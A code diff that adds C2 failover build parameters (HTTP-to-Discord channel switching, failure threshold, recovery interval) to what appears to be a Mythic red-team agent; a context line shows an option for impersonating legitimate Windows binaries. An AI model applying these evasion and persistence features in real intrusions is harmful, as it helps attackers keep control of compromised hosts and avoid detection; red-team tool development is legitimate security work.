@@ -335,6 +335,27 @@ var payloadDefinition = agentstructs.PayloadType{
 			ParameterType: agentstructs.BUILD_PARAMETER_TYPE_STRING,
 		},
 		{
+			Name:          "failover_chain",
+			Description:   "Ordered comma-separated C2 profile chain for automatic failover. Example: 'http,discord' causes the agent to switch to Discord if HTTP fails consecutively. Requires the secondary profile's credentials (e.g., discord_bot_token) to also be set. Supported: http, discord.",
+			Required:      false,
+			DefaultValue:  "",
+			ParameterType: agentstructs.BUILD_PARAMETER_TYPE_STRING,
+		},
+		{
+			Name:          "failover_threshold",
+			Description:   "Consecutive poll failures before switching to the next C2 profile in the failover chain. Default: 5. Only relevant when failover_chain is set.",
+			Required:      false,
+			DefaultValue:  "5",
+			ParameterType: agentstructs.BUILD_PARAMETER_TYPE_STRING,
+		},
+		{
+			Name:          "failover_recovery",
+			Description:   "Seconds between recovery attempts of the primary C2 profile when a backup is active. Default: 300 (5 minutes). Only relevant when failover_chain is set.",
+			Required:      false,
+			DefaultValue:  "300",
+			ParameterType: agentstructs.BUILD_PARAMETER_TYPE_STRING,
+		},
+		{
 			Name:          "pe_preset",
 			Description:   "Windows PE metadata preset — impersonate a legitimate Windows binary's version info (visible in File Properties > Details and Task Manager). Individual pe_* fields override preset values. Windows only — ignored for Linux/macOS.",
 			Required:      false,
